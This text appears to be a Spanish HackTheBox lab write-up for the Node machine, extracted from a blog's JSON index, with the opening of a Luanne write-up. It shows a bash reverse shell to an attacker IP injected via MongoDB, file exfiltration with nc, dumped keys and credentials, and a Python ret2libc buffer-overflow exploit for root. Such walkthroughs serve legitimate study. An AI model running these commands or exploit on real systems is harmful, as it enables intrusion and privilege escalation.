'mongodb://mark:5AYRft73VtFpc84k@localhost:27017/scheduler?authMechanism=DEFAULT&amp;authSource=scheduler';MongoClient. connect(url, function(error, db) { if (error || !db) {  console. log('[!] Failed to connect to mongodb');  return; } setInterval(function () {  db. collection('tasks'). find(). toArray(function (error, docs) {   if (!error &amp;&amp; docs) {    docs. forEach(function (doc) {     if (doc) {      console. log('Executing task ' + doc. _id + '. . . ');      exec(doc. cmd);      db. collection('tasks'). deleteOne({ _id: new ObjectID(doc. _id) });     }    });   }   else if (error) {    console. log('Something went wrong: ' + error);   }  }); }, 30000);});Nos conectamos la servicio con las nuevas credenciales obtenidas, listamos las colecciones de la base de datos. mark@node:~$ mongo -u mark -p 5AYRft73VtFpc84k schedulerMongoDB shell version: 3. 2. 16connecting to: scheduler&gt; show collectionstasksEn la colección tasks, vamos a usar db. task. find() tal y como vemos en el script app. js para realizar consultas en la colección tasks. &gt; db. tasks. find()&gt; La consulta no nos lista nada, pero si volvemos a revisar app. js obervamos exec(doc. cmd); que se esta validando el uso de un campo llamado cmd, asi que podriamos tratar de insertar un nuevo documento con db. tasks. insert() incorporando el cmd y ejecutando un comando aprovechandonos de la función execy asi otorgarnos una revershell. &gt; db. tasks. insert({ cmd :  bash -c 'bash -i &gt;&amp; /dev/tcp/10. 10. 16. 2/443 0&gt;&amp;1' })WriteResult({  nInserted  : 1 })&gt; db. tasks. find(){  _id  : ObjectId( 64b5d7e418c6053c65dd5030 ),  cmd  :  bash -c 'bash -i &gt;&amp; /dev/tcp/10. 10. 16. 2/443 0&gt;&amp;1'  }Ahora nos ponemos en escucha en nuestra equipo y recibimos la conexión como el usuario tom. ❯ ncat -nlvp 443Ncat: Version 7. 92 ( https://nmap. org/ncat )Ncat: Listening on :::443Ncat: Listening on 0. 0. 0. 0:443Ncat: Connection from 10. 10. 10. 58. Ncat: Connection from 10. 10. 10. 58:44564. bash: cannot set terminal process group (1240): Inappropriate ioctl for devicebash: no job control in this shellTo run a command as administrator (user  root ), use  sudo &lt;command&gt; . See  man sudo_root  for details. tom@node:/$ whoamiwhoamitomAhora podemos dirigirnos al directorio personal del usuario y visualizar la primera flag user. txt. tom@node:/$ cd /home/tomcd /home/tomtom@node:~$ cat user. txtcat user. txt4452fba153c742ca44fd79aac0f934c9ELEVACION DE PRIVILEGIOS #: Listando los binarios con privilegios suid, encontramos uno inusual llamando backup. tom@node:/$ find / -perm -4000 2&gt;/dev/nullfind / -perm -4000 2&gt;/dev/null/usr/lib/eject/dmcrypt-get-device/usr/lib/snapd/snap-confine/usr/lib/dbus-1. 0/dbus-daemon-launch-helper/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic/usr/lib/openssh/ssh-keysign/usr/lib/policykit-1/polkit-agent-helper-1/usr/local/bin/backup/usr/bin/chfn/usr/bin/at/usr/bin/gpasswd/usr/bin/newgidmap/usr/bin/chsh/usr/bin/sudo/usr/bin/pkexec/usr/bin/newgrp/usr/bin/passwd/usr/bin/newuidmap/bin/ping/bin/umount/bin/fusermount/bin/ping6/bin/ntfs-3g/bin/su/bin/mountSi tratamos de ejecutar el binario, vemos que no sucede nada. tom@node:/$ /usr/local/bin/backup/usr/local/bin/backuptom@node:/$Pero si volvemos a visualizar el app. js que listamos al principio el cual estaba contenido en el comprimido, observamos una ruta correspondiente a backup la cual se ejecuta con 3 parametros, entre ellos una key y un directorio.  Probamos nuevamente a ejecutarlo con 3 parametros. om@node:/$ /usr/local/bin/backup a a a/usr/local/bin/backup a a a       ____________________________________________________      /                          \      |  _____________________________________________   |      |  |                       |  |      |  |                       |  |      |  |                       |  |      |  |                       |  |      |  |                       |  |      |  |                       |  |      |  |       Secure Backup v1. 0       |  |      |  |                       |  |      |  |                       |  |      |  |                       |  |      |  |                       |  |      |  |                       |  |      |  |                       |  |      |  |_____________________________________________|  |      |                           |      \_____________________________________________________/          \_______________________________________/        _______________________________________________       _-'  . -. -. -. -. -. -. -. -. -. -. -. -. -. -. -. -. -. -.  --- `-_     _-'. -. -. . ---. -. -. -. -. -. -. -. -. -. -. -. -. -. -. -. -. --.  . -. -. `-_    _-'. -. -. -. . ---. -. -. -. -. -. -. -. -. -. -. -. -. -. -. -. -. -`__`. . -. -. -. `-_  _-'. -. -. -. -. . -----. -. -. -. -. -. -. -. -. -. -. -. -. -. -. -. -. -----. . -. -. -. -. `-_ _-'. -. -. -. -. -. . ---. -. . -----------------------------. . -. ---. . ---. -. -. -. `-_:-----------------------------------------------------------------------------:`---. _. -----------------------------------------------------------------. _. ---' [!] Ah-ah-ah! You didn't say the magic word!tom@node:/$Vemos que esta vez funciona, pero ahora usaremos ltrace para ver a bajo nivel el proceso de lo que sucede al ejecutar el binario. tom@node:/$ ltrace /usr/local/bin/backup a b cltrace /usr/local/bin/backup a b cstrncpy(0xffef6578,  b , 100)                                           = 0xffef6578strcpy(0xffef6561,  / )                                              = 0xffef6561strcpy(0xffef656d,  / )                                              = 0xffef656dstrcpy(0xffef64f7,  /e )                                             = 0xffef64f7strcat( /e ,  tc )                                                =  /etc strcat( /etc ,  /m )                                               =  /etc/m strcat( /etc/m ,  yp )                                              =  /etc/myp strcat( /etc/myp ,  la )                                             =  /etc/mypla strcat( /etc/mypla ,  ce )                                            =  /etc/myplace strcat( /etc/myplace ,  /k )                                           =  /etc/myplace/k strcat( /etc/myplace/k ,  ey )                                          =  /etc/myplace/key strcat( /etc/myplace/key ,  s )                                          =  /etc/myplace/keys fopen( /etc/myplace/keys ,  r )                                          = 0x8c06410fgets( a01a6aa5aaf1d7729f35c8278daae30f . . . , 1000, 0x8c06410)                           = 0xffef610fstrcspn( a01a6aa5aaf1d7729f35c8278daae30f . . . ,  \n )                               = 64strcmp( b ,  a01a6aa5aaf1d7729f35c8278daae30f . . . )                                = 1fgets( 45fac180e9eee72f4fd2d9386ea7033e . . . , 1000, 0x8c06410)                           = 0xffef610fstrcspn( 45fac180e9eee72f4fd2d9386ea7033e . . . ,  \n )                               = 64strcmp( b ,  45fac180e9eee72f4fd2d9386ea7033e . . . )                                = 1fgets( 3de811f4ab2b7543eaf45df611c2dd25 . . . , 1000, 0x8c06410)                           = 0xffef610fstrcspn( 3de811f4ab2b7543eaf45df611c2dd25 . . . ,  \n )                               = 64strcmp( b ,  3de811f4ab2b7543eaf45df611c2dd25 . . . )                                = 1fgets( \n , 1000, 0x8c06410)                                           = 0xffef610fstrcspn( \n ,  \n )                                                = 0strcmp( b ,   )                                                  = 1fgets(nil, 1000, 0x8c06410)                                            = 0strcpy(0xffef5148,  Ah-ah-ah! You didn't say the mag . . . )                             = 0xffef5148printf(  %s[!]%s %s\n ,  \033[33m ,  \033[37m ,  Ah-ah-ah! You didn't say the mag . . . [!] Ah-ah-ah! You didn't say the magic word!Observamos que compara el segundo campo b con una key de un archivo /etc/myplace/keys que si lo listamos podemos ver el contenido. tom@node:/$ cat /etc/myplace/keyscat /etc/myplace/keysa01a6aa5aaf1d7729f35c8278daae30f8a988257144c003f8b12c5aec39bc50845fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d4743de811f4ab2b7543eaf45df611c2dd2541a5fc5af601772638b81dce6852d110Podemos usar una de las keys y como tercer parametro ya que nos pide ingresar un directorio, podriamos tratar de visualizar la flag de root. /usr/local/bin/backup a 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 root       ____________________________________________________      /                          \      |  _____________________________________________   |      |  |                       |  |      |  |                       |  |      |  |                       |  |      |  |                       |  |      |  |                       |  |      |  |                       |  |      |  |       Secure Backup v1. 0       |  |      |  |                       |  |      |  |                       |  |      |  |                       |  |      |  |                       |  |      |  |                       |  |      |  |                       |  |      |  |_____________________________________________|  |      |                           |      \_____________________________________________________/          \_______________________________________/        _______________________________________________       _-'  . -. -. -. -. -. -. -. -. -. -. -. -. -. -. -. -. -. -.  --- `-_     _-'. -. -. . ---. -. -. -. -. -. -. -. -. -. -. -. -. -. -. -. -. --.  . -. -. `-_    _-'. -. -. -. . ---. -. -. -. -. -. -. -. -. -. -. -. -. -. -. -. -. -`__`. . -. -. -. `-_  _-'. -. -. -. -. . -----. -. -. -. -. -. -. -. -. -. -. -. -. -. -. -. -. -----. . -. -. -. -. `-_ _-'. -. -. -. -. -. . ---. -. . -----------------------------. . -. ---. . ---. -. -. -. `-_:-----------------------------------------------------------------------------:`---. _. -----------------------------------------------------------------. _. ---' [+] Validated access token [+] Starting archiving root [+] Finished! Encoded backup is below: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Nos devuelve un resultado en base64, y si lo decodeamos obtenemos un archivo comprimido, y al unzipearlo nos pide ingresar una contraseña. ❯ unzip fileArchive: file[file] root/. profile password: Podemos usar la que previamente obtuvimos con fcrackzip ya que se puede estar reutilizando la contraseña. ❯ unzip fileArchive: file[file] root/. profile password:  inflating: root/. profile      extracting: root/. cache/motd. legal-displayed  extracting: root/root. txt       inflating: root/. bashrc       inflating: root/. viminfo      extracting: root/. nano/search_history ❯ ❯ ls root  fileEfectivamente logramos descomprimirlo usando la contraseña previa magicword, ahora podemos ver lo que hay dentro del directorio y encontramos la segunda flag root. txt. ❯ cd root❯ ls root. txt❯ cat root. txt98ef491742abffa14a62facb8d832818EXPLOTACION ALTERNA #: Vimos anteriormente que pudimos leer la flag root. txt, pero no logramos obtener acceso como el usuario root al sistema. Anteriormente vimos que al binario backup, le pasabamos un parametro final correspondiente a un directorio, pero si tratamos de pasar muchos caracteres como ultimo parametro hacemos que el programa se corrompa. tom@node:/$ /usr/local/bin/backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 $(python -c 'print( A *40000)')  /usr/local/bin/backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 $(python -c 'print( A *40000)')Segmentation fault (core dumped)Vemos que se acontece un desbordamiento de buffer o bufferoverflow. Vamos a traernos el binario a nuestro equipo. tom@node:/usr/local/bin$ nc 10. 10. 16. 2 443 &lt; backupnc 10. 10. 16. 2 443 &lt; backupPara ejecutarlo sin problemas, voy a crearme un directorio y el archivo donde se almacenan las keys. ❯ mkdir /etc/myplace❯ nvim /etc/myplace/keys❯ cat /etc/myplace/keysa01a6aa5aaf1d7729f35c8278daae30f8a988257144c003f8b12c5aec39bc50845fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d4743de811f4ab2b7543eaf45df611c2dd2541a5fc5af601772638b81dce6852d110Para poder ver los registros al ejecutar el binario a bajo nivel usare gdb. gef➤ r a 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 $(python3 -c 'print( A *3000)') Vemos que se acontece el desbordamiento sobrescribiendo los registros y que alteran el flujo del programa, esto termina corrompiendolo cuando introducimos muchos caracteres capaces de sobrepasar el tamaño del buffer asignado.  Si quieres saber mas acerca de esto te dejo el siguiente articulo:  https://keepcoding. io/blog/que-es-un-buffer-overflow/Lo que podriamos hacer es que el flujo del programa podemos meterlo en la pila, donde a traves de un shellcode podemos ejecutar comandos y otorgarnos una reverse shell. Pero si vemos las protecciones del binario este cuenta con data execution prevention. NX. gef➤ checksec[+] checksec for '/home/fmiracle/Machines/Node/content/backup'[*] . gef-2b72f5d0d9f0f218a91cd1ca5148e45923b950d5. py:L8764 'checksec' is deprecated and will be removed in a feature release. Use Elf(fname). checksec()Canary            : ✘ NX              : ✓ PIE              : ✘ Fortify            : ✘ RelRO             : PartialAsi que necesitamos buscar otra forma de explotar del binario. Podemos usar un ret2libc que lo que hace es aprovecharse la la libreria libc que el binario esta utilizando. tom@node:/usr/local/bin$ which backup | xargs lddwhich backup | xargs ldd	linux-gate. so. 1 =&gt; (0xf7723000)	libc. so. 6 =&gt; /lib32/libc. so. 6 (0xf7564000)	/lib/ld-linux. so. 2 (0xf7724000)tom@node:/usr/local/bin$Con ello en vez de mandar el flujo del programa a la pila, podemos usar el libc para ejecutar una llamada a nivel de sistema. Para ello necesitamos primero saber si la maquina cuenta con ÀSLR aleatorizacion de direcciones de la memoria, ello podemos verificarlo leyendo. cat /proc/sys/kernel/randomize_va_space2Al tener un valor de 2, quiere decir que la maquina si cuenta con ASLR. Otra forma de verlo seria usando la siguente expresión, donde podemos ver que efectivamente cuenta con ASLR al cambiar las direcciones. for i in $(seq 1 10); do which backup | xargs ldd | grep libc | awk 'NF{print $NF}' | tr -d '()'; done&lt;ch backup | xargs ldd | grep libc | awk 'NF{print $NF}' | tr -d '()'; done 0xf75530000xf752d0000xf75a70000xf75bc0000xf75790000xf76180000xf75ff0000xf76130000xf76010000xf7556000Pero pese a que exista ASLR, al no ser muy largas pueden repetirse, por tanto aunque sean aleatorios pueden volver a repetirse al haber una colision, podemos burlar el ASLR. for i in $(seq 1 1000); do which backup | xargs ldd | grep libc | awk 'NF{print $NF}' | tr -d '()' | grep 0xf752d000; done; break &lt;grep libc | awk 'NF{print $NF}' | tr -d '()' | grep 0xf752d000; done; break 0xf752d0000xf752d0000xf752d000bash: break: only meaningful in a `for', `while', or `until' loopAhora para poder ejecutar un ret2lib y poder ejecutar una llamada a nivel de sistema necesitaremos:  La dirección de system La dirección de exit La dirección de la cadena /bin/shBasicamente lo que queremos lograr es os. system( /bin/sh ) y al ser el binario suid lo hara como root y ganaremos acceso como este usuario. Para ello primero debemos de saber de las A que insertamos antes cuantas debemos insertar para tener control del registro eip. Para lo cual podemos usar pattern create y generar un numero de cadena aleatoria. gef➤ pattern create 1000[+] Generating a pattern of 1000 bytes (n=4)aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaafdaafeaaffaafgaafhaafiaafjaafkaaflaafmaafnaafoaafpaafqaafraafsaaftaafuaafvaafwaafxaafyaafzaagbaagcaagdaageaagfaaggaaghaagiaagjaagkaaglaagmaagnaagoaagpaagqaagraagsaagtaaguaagvaagwaagxaagyaagzaahbaahcaahdaaheaahfaahgaahhaahiaahjaahkaahlaahmaahnaahoaahpaahqaahraahsaahtaahuaahvaahwaahxaahyaahzaaibaaicaaidaaieaaifaaigaaihaaiiaaijaaikaailaaimaainaaioaaipaaiqaairaaisaaitaaiuaaivaaiwaaixaaiyaaizaajbaajcaajdaajeaajfaajgaajhaajiaajjaajkaajlaajmaajnaajoaajpaajqaajraajsaajtaajuaajvaajwaajxaajyaaj[+] Saved as '$_gef0'gef➤ Insertamos la cadena generada.  Y ahora con pattern offset podemos saber cual es el limite para sobreescribir eip. gef➤ patter offset $eip[+] Searching for '$eip'[+] Found at offset 512 (little-endian search) likely[+] Found at offset 320 (big-endian search)Vemos que necesitamos 512 caracteres antes de sobrescribir eip. Verificamos con la ayuda de python imprimiendo 512 A y adicionamos 4 B, que como resultado ahora el registro eip valdria BBBB.  Ahora que sabemos el offset lo siguiente sera encontrar las direcciones de system, exit y sh. Y para ello primero vamos a coger una dirección base de libc, puede ser cualquiera 0xf752d000. Teniendo esto podemos ir armandonos un script en python. Donde primero especificamos el offset de caracteres, debemos encontrar primero los offsets de las direcciones de system, exit y binsh. Ya que una vez tengamos estos podamos obtener las direcciones reales de estas usando la libc_base + los offsets de cada una. Y usamos pack para representar las direcciones en litelediam y evitar darle la vuelta a las direcciones. #!/usr/bin/python3from struct import packoffset = 512junk =  A *offset#ret2lib - EIP -&gt; system -&gt; exit -&gt; /bin/shlibc_base_add = 0xf752d000system_add_offset = exit_add_offset = binsh_add_offset = system_add_real = pack( &lt;I , libc_base_add + system_add_offset )exit_add_real = pack( &lt;I , libc_base_add + exit_add_offset)binsh_add_real = pack( &lt;I ), libc_base_add + binsh_add_offset)payload = junk + system_add_real + exit_add_real + binsh_add_realFinalmente como payload deberiamos pasarle el junk sumado mas las direcciones reales de system, exit y binsh. Ahora para conseguir los offset, primero usaremos readelf para las direcciones de system y exit. readelf -s /lib32/libc. so. 6 | grep -E   system@@| exit@@ &lt;adelf -s /lib32/libc. so. 6 | grep -E   system@@| exit@@             141: 0002e7b0  31 FUNC  GLOBAL DEFAULT  13 exit@@GLIBC_2. 0 1457: 0003a940  55 FUNC  WEAK  DEFAULT  13 system@@GLIBC_2. 0Y para obtener el offset de binsh, podemos usar strings con los siguientes parametros: strings -a -t x /lib32/libc. so. 6 | grep  /bin/sh  15900b /bin/shAhora solo debemos correr el programa multiples veces, para causar una colision en las direcciones hasta que libc valga lo que ejecutamos en el script. #!/usr/bin/python3from struct import packoffset = 512junk =  A *offset#ret2lib - EIP -&gt; system -&gt; exit -&gt; /bin/shlibc_base_add = 0xf752d000system_add_offset = 0x0002e7b0exit_add_offset = 0x0003a940binsh_add_offset = 0x0015900bsystem_add_real = pack( &lt;I , libc_base_add + system_add_offset )exit_add_real = pack( &lt;I , libc_base_add + exit_add_offset)binsh_add_real = pack( &lt;I ), libc_base_add + binsh_add_offset)payload = junk + system_add_real + exit_add_real + binsh_add_realprint(payload)Ejecutamos el exploit multiples veces y se ejecuta la /bin/sh y ganamos acceso como el usuario root, ahora solo debemos dirigirnos al directorio personal del usuario root y visualizar la segunda flag root. txt. while true; do backup a 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 $(python exploit. py); done# whoamiroot#cd /rootcat root. txt98ef491742abffa14a62facb8d832818"
    }, {
    "id": 21,
    "url": "http://localhost:4000/hackthebox/htb-writeup-Luanne",
    "title": "Maquina Luanne - htb writeup",
    "body": "2023/06/29 - El dia de hoy vamos a resolver Luanne de hackthebox una maquina linux de dificultad facil, para poder comprometer la maquina nos aprovecharemos de una ruta expuesta con una api en JSON donde con la ayuda de burpsuite aprovecharemos el uso de parametros para causar una inyección en lua con la que ganaremos acceso a la maquina, despues aprovecharemos de un parametro de un servicio de httpd que corre en NETBSD obteniendo una clave publica con la que ganaremos acceso como un usario con mayores privilegios y finalmente en un comprimido que lograremos desencriptar obtendremos la contraseña del usuario root y habremos comprometido el sistema. Esta maquina es divertida asi que a darle!. Vamos a comenzar como de costumbre creando un directorio con el nombre de la maquina: ❯ mkdir Luanne❯ ls LuanneSeguidamente con la funcion mkt crearemos nuestros directorios de trabajo: ❯ which mktmkt () {	mkdir {nmap,content,exploits,scripts}}❯ mkt❯ ls content  exploits  nmap  scriptsENUMERACION #: Comenzaremos con la fase de Enumeracion, mandando una traza a la ip de la maquina victima con el comando ping: ❯ ping -c 1 10. 10. 10. 218PING 10. 10. 10. 218 (10. 10. 10. 218) 56(84) bytes of data. 64 bytes from 10. 10. 10. 218: icmp_seq=1 ttl=254 time=123 ms--- 10. 10. 10. 218 ping statistics ---1 packets transmitted, 1 received, 0% packet loss, time 0msrtt min/avg/max/mdev = 122. 913/122. 913/122. 913/0. 000 msVemos que la maquina nos responde, con un ttl de 254 y contando el salto al ser 255, podemos usar siguiente pagina para saber a que posiblemente nos estamos enfrentando, que en este caso podria corresponder a un NetBSD. Mas adelante cuando comprometamos la maquina validaremos si es correcto.  https://subinsb. com/default-device-ttl-values/ ESCANEO DE PUERTOS:       Parámetro   Descripción         -p-   Escaneamos todos los 65535 puertos.        –open   Solo los puertos que estén abiertos.        -v   Permite ver en consola lo que va encontrando (verbose).        -oG   Guarda el output en un archivo con formato grepeable para que mediante una funcion de S4vitar nos va a permitir extraer cada uno de los puertos y copiarlos sin importar la cantidad en la clipboard y asi al hacer ctrl_c esten disponibles   Procedemos a escanear los puertos abiertos y lo exportaremos al archivo de nombre openPorts: ❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10. 10. 10. 218 -oG openPortsHost discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower. Starting Nmap 7. 92 ( https://nmap. org ) at 2023-06-29 16:31 GMTInitiating SYN Stealth Scan at 16:31Scanning 10. 10. 10. 218 [65535 ports]Discovered open port 80/tcp on 10. 10. 10. 218Discovered open port 22/tcp on 10. 10. 10. 218Discovered open port 9001/tcp on 10. 10. 10. 218Completed SYN Stealth Scan at 16:32, 26. 67s elapsed (65535 total ports)Nmap scan report for 10. 10. 10. 218Host is up, received user-set (0. 28s latency). Scanned at 2023-06-29 16:31:40 GMT for 27sNot shown: 62926 filtered tcp ports (no-response), 2606 closed tcp ports (reset)Some closed ports may be reported as filtered due to --defeat-rst-ratelimitPORT   STATE SERVICE  REASON22/tcp  open ssh    syn-ack ttl 6380/tcp  open http    syn-ack ttl 639001/tcp open tor-orport syn-ack ttl 63Read data files from: 